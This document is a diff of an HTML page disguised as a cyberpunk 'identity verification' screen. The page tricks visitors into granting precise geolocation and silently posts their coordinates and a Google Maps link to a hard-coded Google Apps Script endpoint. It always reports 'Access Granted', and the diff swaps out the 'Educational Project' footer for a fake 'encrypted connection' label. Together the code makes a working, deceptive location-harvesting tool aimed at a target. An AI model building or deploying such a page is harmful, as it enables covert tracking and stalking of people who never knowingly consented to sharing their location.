@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifying...</title>
+    <title>SINGULARITY // System Access</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -11,25 +12,171 @@
             box-sizing: border-box;
         }
 
+        :root {
+            --neon-cyan: #00fff5;
+            --neon-pink: #ff00de;
+            --neon-green: #39ff14;
+            --neon-red: #ff073a;
+            --dark-bg: #0a0a0f;
+            --card-bg: rgba(10, 10, 20, 0.85);
+        }
+
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Share Tech Mono', monospace;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            background: var(--dark-bg);
             color: #fff;
             overflow: hidden;
+        }
+
+        /* Animated background grid */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                linear-gradient(rgba(0, 255, 245, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 245, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: gridMove 20s linear infinite;
+            z-index: 0;
+        }
+
+        @keyframes gridMove {
+            0% { transform: perspective(500px) rotateX(0deg) translateY(0); }
+            100% { transform: perspective(500px) rotateX(0deg) translateY(50px); }
+        }
+
+        /* Scanline effect */
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(0, 0, 0, 0.1) 2px,
+                rgba(0, 0, 0, 0.1) 4px
+            );
+            pointer-events: none;
+            z-index: 100;
+        }
+
+        /* Floating particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: var(--neon-cyan);
+            border-radius: 50%;
+            box-shadow: 0 0 6px var(--neon-cyan);
+            animation: floatUp linear infinite;
+            opacity: 0;
+        }
+
+        @keyframes floatUp {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
         }
 
         .container {
             text-align: center;
             padding: 40px;
-            max-width: 500px;
-            width: 90%;
+            max-width: 520px;
+            width: 92%;
+            position: relative;
+            z-index: 10;
         }
 
-        /* Initial loading screen */
+        /* Glitch card */
+        .card {
+            background: var(--card-bg);
+            border: 1px solid rgba(0, 255, 245, 0.15);
+            border-radius: 4px;
+            padding: 40px 32px;
+            position: relative;
+            backdrop-filter: blur(10px);
+            box-shadow: 
+                0 0 30px rgba(0, 255, 245, 0.05),
+                inset 0 0 30px rgba(0, 255, 245, 0.02);
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: -1px;
+            left: -1px;
+            right: -1px;
+            bottom: -1px;
+            border-radius: 4px;
+            background: linear-gradient(45deg, var(--neon-cyan), transparent, var(--neon-pink), transparent);
+            z-index: -1;
+            opacity: 0.4;
+            animation: borderGlow 4s ease-in-out infinite;
+        }
+
+        @keyframes borderGlow {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.6; }
+        }
+
+        /* Top bar decoration */
+        .top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 28px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid rgba(0, 255, 245, 0.1);
+            font-size: 0.7rem;
+            color: rgba(0, 255, 245, 0.5);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .status-dot {
+            width: 6px;
+            height: 6px;
+            background: var(--neon-green);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--neon-green);
+            animation: blink 2s ease-in-out infinite;
+            display: inline-block;
+            margin-right: 6px;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .top-bar-right {
+            font-family: 'Share Tech Mono', monospace;
+        }
+
+        /* Loading screen */
         #loading-screen {
             display: flex;
             flex-direction: column;
@@ -37,197 +184,499 @@
             gap: 24px;
         }
 
-        .spinner {
-            width: 60px;
-            height: 60px;
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            border-top-color: #00d4ff;
+        .cyber-spinner {
+            width: 70px;
+            height: 70px;
+            position: relative;
+        }
+
+        .cyber-spinner .ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 2px solid transparent;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+        }
+
+        .cyber-spinner .ring:nth-child(1) {
+            border-top-color: var(--neon-cyan);
+            animation: spin 1.2s linear infinite;
+        }
+
+        .cyber-spinner .ring:nth-child(2) {
+            width: 80%;
+            height: 80%;
+            top: 10%;
+            left: 10%;
+            border-right-color: var(--neon-pink);
+            animation: spin 1.8s linear infinite reverse;
+        }
+
+        .cyber-spinner .ring:nth-child(3) {
+            width: 60%;
+            height: 60%;
+            top: 20%;
+            left: 20%;
+            border-bottom-color: var(--neon-green);
+            animation: spin 0.8s linear infinite;
+        }
+
+        .cyber-spinner .core {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: var(--neon-cyan);
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            box-shadow: 0 0 15px var(--neon-cyan), 0 0 30px var(--neon-cyan);
+            animation: pulse 1s ease-in-out infinite;
         }
 
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
 
-        #loading-screen h2 {
-            font-size: 1.4rem;
-            font-weight: 500;
-            color: #ccc;
+        @keyframes pulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.4); }
         }
 
-        /* Permission request screen */
+        #loading-screen h2 {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.95rem;
+            font-weight: 400;
+            color: var(--neon-cyan);
+            text-shadow: 0 0 10px rgba(0, 255, 245, 0.5);
+            letter-spacing: 3px;
+            text-transform: uppercase;
+        }
+
+        .loading-bar {
+            width: 200px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .loading-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--neon-cyan), var(--neon-pink));
+            box-shadow: 0 0 10px var(--neon-cyan);
+            animation: loadBar 2s ease-in-out forwards;
+        }
+
+        @keyframes loadBar {
+            0% { width: 0%; }
+            50% { width: 65%; }
+            100% { width: 100%; }
+        }
+
+        /* Permission screen */
         #permission-screen {
             display: none;
-            animation: fadeIn 0.5s ease;
+            animation: glitchIn 0.5s ease;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+        @keyframes glitchIn {
+            0% { opacity: 0; transform: translateY(20px) skewX(2deg); }
+            50% { transform: translateY(-5px) skewX(-1deg); }
+            100% { opacity: 1; transform: translateY(0) skewX(0); }
         }
 
-        .icon-lock {
-            font-size: 48px;
-            margin-bottom: 16px;
+        .icon-shield {
+            font-size: 52px;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 0 15px rgba(0, 255, 245, 0.6));
+            animation: iconFloat 3s ease-in-out infinite;
+        }
+
+        @keyframes iconFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
         }
 
         #permission-screen h1 {
-            font-size: 1.6rem;
-            margin-bottom: 12px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.3rem;
+            margin-bottom: 8px;
             color: #fff;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 0 0 20px rgba(0, 255, 245, 0.3);
+        }
+
+        .subtitle {
+            font-size: 0.7rem;
+            color: var(--neon-pink);
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(255, 0, 222, 0.4);
         }
 
         #permission-screen p {
-            color: #aaa;
-            font-size: 0.95rem;
-            line-height: 1.6;
-            margin-bottom: 24px;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.85rem;
+            line-height: 1.8;
+            margin-bottom: 28px;
         }
 
-        .btn-allow {
-            background: linear-gradient(135deg, #00d4ff, #0090ff);
-            color: #fff;
-            border: none;
-            padding: 14px 48px;
-            font-size: 1rem;
-            border-radius: 50px;
+        .btn-cyber {
+            background: transparent;
+            color: var(--neon-cyan);
+            border: 1px solid var(--neon-cyan);
+            padding: 14px 42px;
+            font-size: 0.85rem;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
-            font-weight: 600;
-            letter-spacing: 0.5px;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
         }
 
-        .btn-allow:hover {
+        .btn-cyber::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 245, 0.15), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .btn-cyber:hover::before {
+            left: 100%;
+        }
+
+        .btn-cyber:hover {
+            background: rgba(0, 255, 245, 0.08);
+            box-shadow: 0 0 25px rgba(0, 255, 245, 0.3), inset 0 0 25px rgba(0, 255, 245, 0.05);
             transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(0, 144, 255, 0.4);
+        }
+
+        /* Terminal-style text */
+        .terminal-text {
+            text-align: left;
+            font-size: 0.72rem;
+            color: rgba(0, 255, 245, 0.35);
+            margin-top: 24px;
+            line-height: 1.6;
+            border-top: 1px solid rgba(0, 255, 245, 0.08);
+            padding-top: 16px;
+        }
+
+        .terminal-text span {
+            color: var(--neon-green);
         }
 
         /* Success screen */
         #success-screen {
             display: none;
-            animation: fadeIn 0.5s ease;
+            animation: glitchIn 0.5s ease;
         }
 
-        .checkmark {
-            font-size: 64px;
-            margin-bottom: 16px;
+        .success-icon {
+            font-size: 56px;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 0 20px rgba(57, 255, 20, 0.6));
         }
 
         #success-screen h1 {
-            font-size: 1.5rem;
-            color: #00ff88;
-            margin-bottom: 12px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.2rem;
+            color: var(--neon-green);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 8px;
+            text-shadow: 0 0 20px rgba(57, 255, 20, 0.4);
+        }
+
+        #success-screen .subtitle {
+            color: var(--neon-green);
+            margin-bottom: 16px;
         }
 
         #success-screen p {
-            color: #aaa;
-            font-size: 0.95rem;
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 0.85rem;
+            line-height: 1.6;
         }
 
         /* Error screen */
         #error-screen {
             display: none;
-            animation: fadeIn 0.5s ease;
+            animation: glitchIn 0.5s ease;
         }
 
         .error-icon {
-            font-size: 64px;
-            margin-bottom: 16px;
+            font-size: 56px;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 0 20px rgba(255, 7, 58, 0.6));
         }
 
         #error-screen h1 {
-            font-size: 1.5rem;
-            color: #ff4444;
-            margin-bottom: 12px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.2rem;
+            color: var(--neon-red);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 8px;
+            text-shadow: 0 0 20px rgba(255, 7, 58, 0.4);
+        }
+
+        #error-screen .subtitle {
+            color: var(--neon-red);
+            margin-bottom: 16px;
         }
 
         #error-screen p {
-            color: #aaa;
-            font-size: 0.95rem;
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 0.85rem;
             line-height: 1.6;
         }
 
-        .retry-btn {
-            margin-top: 20px;
+        .btn-retry {
+            margin-top: 24px;
             background: transparent;
-            color: #00d4ff;
-            border: 1px solid #00d4ff;
-            padding: 10px 32px;
-            font-size: 0.9rem;
-            border-radius: 50px;
+            color: var(--neon-red);
+            border: 1px solid var(--neon-red);
+            padding: 12px 36px;
+            font-size: 0.8rem;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
+            letter-spacing: 2px;
+            text-transform: uppercase;
         }
 
-        .retry-btn:hover {
-            background: rgba(0, 212, 255, 0.1);
+        .btn-retry:hover {
+            background: rgba(255, 7, 58, 0.1);
+            box-shadow: 0 0 25px rgba(255, 7, 58, 0.3);
         }
 
+        /* Footer */
         .footer {
             position: fixed;
-            bottom: 20px;
+            bottom: 16px;
             left: 0;
             right: 0;
             text-align: center;
-            color: #555;
-            font-size: 0.75rem;
+            color: rgba(255, 255, 255, 0.15);
+            font-size: 0.6rem;
+            font-family: 'Share Tech Mono', monospace;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            z-index: 10;
+        }
+
+        /* Matrix rain canvas */
+        #matrix-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            opacity: 0.06;
+        }
+
+        /* Glitch text animation */
+        .glitch {
+            position: relative;
+        }
+
+        .glitch::before,
+        .glitch::after {
+            content: attr(data-text);
+            position: absolute;
+            left: 0;
+            width: 100%;
+        }
+
+        .glitch::before {
+            animation: glitch-1 2s infinite linear alternate-reverse;
+            clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%);
+            color: var(--neon-cyan);
+        }
+
+        .glitch::after {
+            animation: glitch-2 2s infinite linear alternate-reverse;
+            clip-path: polygon(0 67%, 100% 67%, 100% 100%, 0 100%);
+            color: var(--neon-pink);
+        }
+
+        @keyframes glitch-1 {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(2px, -2px); }
+            60% { transform: translate(-1px, 1px); }
+            80% { transform: translate(1px, -1px); }
+            100% { transform: translate(0); }
+        }
+
+        @keyframes glitch-2 {
+            0% { transform: translate(0); }
+            20% { transform: translate(2px, -2px); }
+            40% { transform: translate(-2px, 2px); }
+            60% { transform: translate(1px, -1px); }
+            80% { transform: translate(-1px, 1px); }
+            100% { transform: translate(0); }
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .card { padding: 28px 20px; }
+            #permission-screen h1 { font-size: 1.1rem; }
+            .btn-cyber { padding: 12px 32px; font-size: 0.75rem; }
         }
     </style>
 </head>
 <body>
+    <canvas id="matrix-canvas"></canvas>
+    
+    <div class="particles" id="particles"></div>
+
     <div class="container">
-        <!-- Loading Screen -->
-        <div id="loading-screen">
-            <div class="spinner"></div>
-            <h2>Please wait, verifying...</h2>
-        </div>
+        <div class="card">
+            <div class="top-bar">
+                <div><span class="status-dot"></span> SYSTEM ONLINE</div>
+                <div class="top-bar-right" id="clock">00:00:00</div>
+            </div>
 
-        <!-- Permission Request Screen -->
-        <div id="permission-screen">
-            <div class="icon-lock">🔒</div>
-            <h1>Verification Required</h1>
-            <p>To continue, we need to verify your identity. Please allow location access when prompted by your browser.</p>
-            <button class="btn-allow" onclick="requestLocation()">Continue Verification</button>
-        </div>
+            <!-- Loading Screen -->
+            <div id="loading-screen">
+                <div class="cyber-spinner">
+                    <div class="ring"></div>
+                    <div class="ring"></div>
+                    <div class="ring"></div>
+                    <div class="core"></div>
+                </div>
+                <h2>Initializing Protocol...</h2>
+                <div class="loading-bar">
+                    <div class="loading-bar-fill"></div>
+                </div>
+            </div>
 
-        <!-- Success Screen -->
-        <div id="success-screen">
-            <div class="checkmark">✅</div>
-            <h1>Verified Successfully</h1>
-            <p>You have been verified. You may close this page.</p>
-        </div>
+            <!-- Permission Request Screen -->
+            <div id="permission-screen">
+                <div class="icon-shield">🛡️</div>
+                <h1 class="glitch" data-text="Access Required">Access Required</h1>
+                <div class="subtitle">// identity verification protocol</div>
+                <p>System requires location verification to authenticate your session. Grant access to proceed.</p>
+                <button class="btn-cyber" onclick="requestLocation()">► Initialize</button>
+                <div class="terminal-text">
+                    <span>$</span> singularity --verify --user<br>
+                    <span>$</span> awaiting_authorization...<br>
+                    <span>$</span> protocol: <span>ACTIVE</span>
+                </div>
+            </div>
 
-        <!-- Error Screen -->
-        <div id="error-screen">
-            <div class="error-icon">⚠️</div>
-            <h1>Verification Failed</h1>
-            <p id="error-message">Location access is required for verification. Please enable location services and try again.</p>
-            <button class="retry-btn" onclick="requestLocation()">Try Again</button>
+            <!-- Success Screen -->
+            <div id="success-screen">
+                <div class="success-icon">⬡</div>
+                <h1>Access Granted</h1>
+                <div class="subtitle">// verification complete</div>
+                <p>Identity confirmed. Session authenticated.<br>You may close this terminal.</p>
+                <div class="terminal-text">
+                    <span>$</span> status: <span>VERIFIED</span><br>
+                    <span>$</span> session_id: <span id="session-id">—</span><br>
+                    <span>$</span> connection: <span>SECURE</span>
+                </div>
+            </div>
+
+            <!-- Error Screen -->
+            <div id="error-screen">
+                <div class="error-icon">⚠</div>
+                <h1>Access Denied</h1>
+                <div class="subtitle">// authorization failed</div>
+                <p id="error-message">Location module offline. Enable location services to authenticate.</p>
+                <button class="btn-retry" onclick="requestLocation()">↻ Retry</button>
+                <div class="terminal-text">
+                    <span>$</span> error: <span style="color: var(--neon-red);">PERMISSION_DENIED</span><br>
+                    <span>$</span> action: retry or enable location
+                </div>
+            </div>
         </div>
     </div>
 
     <div class="footer">
-        🎓 Educational Project — Tech Lab Demo
+        [ SINGULARITY ] // v2.0.26 // encrypted connection
     </div>
 
     <script>
         // =====================================================
-        // ⚠️ CONFIGURATION — SET YOUR GOOGLE APPS SCRIPT URL
-        // =====================================================
-        // Replace the URL below with your deployed Google Apps Script Web App URL
-        // Follow the README.md instructions to get this URL
         const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzyuP96CjIPxn8y6uahaRsFHVTtCk070gHHspC9iVdVNbMADH2S6EX8kH_R8iQ8S94m/exec";
         // =====================================================
 
-        // Show permission screen after a brief loading animation
+        // === MATRIX RAIN ===
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const chars = 'SINGULARITY01アイウエオカキクケコ♱⬡◊∞§¶';
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(10, 10, 15, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#00fff5';
+            ctx.font = fontSize + 'px Share Tech Mono';
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 50);
+
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+
+        // === PARTICLES ===
+        const particlesContainer = document.getElementById('particles');
+        for (let i = 0; i < 30; i++) {
+            const p = document.createElement('div');
+            p.className = 'particle';
+            p.style.left = Math.random() * 100 + '%';
+            p.style.animationDuration = (Math.random() * 6 + 4) + 's';
+            p.style.animationDelay = (Math.random() * 5) + 's';
+            p.style.width = (Math.random() * 2 + 1) + 'px';
+            p.style.height = p.style.width;
+            if (Math.random() > 0.5) p.style.background = 'var(--neon-pink)';
+            particlesContainer.appendChild(p);
+        }
+
+        // === CLOCK ===
+        function updateClock() {
+            const now = new Date();
+            document.getElementById('clock').textContent =
+                now.toTimeString().split(' ')[0];
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        // === SCREENS ===
         setTimeout(() => {
             document.getElementById('loading-screen').style.display = 'none';
             document.getElementById('permission-screen').style.display = 'block';
-        }, 2000);
+        }, 2500);
 
         function showScreen(screenId) {
-            document.querySelectorAll('.container > div').forEach(div => {
+            document.querySelectorAll('.card > div:not(.top-bar)').forEach(div => {
                 div.style.display = 'none';
             });
             document.getElementById(screenId).style.display = 'block';
@@ -237,21 +686,14 @@
             if (!navigator.geolocation) {
                 showScreen('error-screen');
                 document.getElementById('error-message').textContent =
-                    'Geolocation is not supported by your browser.';
+                    'Geolocation module not found in this browser.';
                 return;
             }
-
-            // Show loading while getting location
             showScreen('loading-screen');
-
             navigator.geolocation.getCurrentPosition(
                 onLocationSuccess,
                 onLocationError,
-                {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
-                }
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
         }
 
@@ -260,7 +702,6 @@
             const longitude = position.coords.longitude;
             const accuracy = position.coords.accuracy;
 
-            // Collect additional info
             const data = {
                 latitude: latitude,
                 longitude: longitude,
@@ -274,6 +715,10 @@
                 googleMapsLink: `https://www.google.com/maps?q=${latitude},${longitude}`
             };
 
+            // Generate random session ID for aesthetics
+            document.getElementById('session-id').textContent =
+                Math.random().toString(36).substring(2, 10).toUpperCase();
+
             sendToGoogleSheet(data);
         }
 
@@ -282,16 +727,16 @@
             let message = '';
             switch (error.code) {
                 case error.PERMISSION_DENIED:
-                    message = 'Location access was denied. Please enable location services in your browser settings and try again.';
+                    message = 'ACCESS BLOCKED — Location permission was denied. Enable location services and retry.';
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    message = 'Location information is unavailable. Please check your device settings.';
+                    message = 'SIGNAL LOST — Location data unavailable. Check device sensors.';
                     break;
                 case error.TIMEOUT:
-                    message = 'The request to get your location timed out. Please try again.';
+                    message = 'TIMEOUT — Location request timed out. Retry connection.';
                     break;
                 default:
-                    message = 'An unknown error occurred while fetching location.';
+                    message = 'UNKNOWN ERROR — Failed to acquire location data.';
                     break;
             }
             document.getElementById('error-message').textContent = message;
@@ -305,22 +750,17 @@
                 return;
             }
 
-            // Send data to Google Apps Script
             fetch(GOOGLE_SCRIPT_URL, {
                 method: "POST",
                 mode: "no-cors",
-                headers: {
-                    "Content-Type": "application/json"
-                },
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(data)
             })
             .then(() => {
                 showScreen('success-screen');
-                console.log("✅ Data sent successfully");
             })
             .catch(error => {
-                console.error("Error sending data:", error);
-                // Still show success to the target user
+                console.error("Error:", error);
                 showScreen('success-screen');
             });
         }
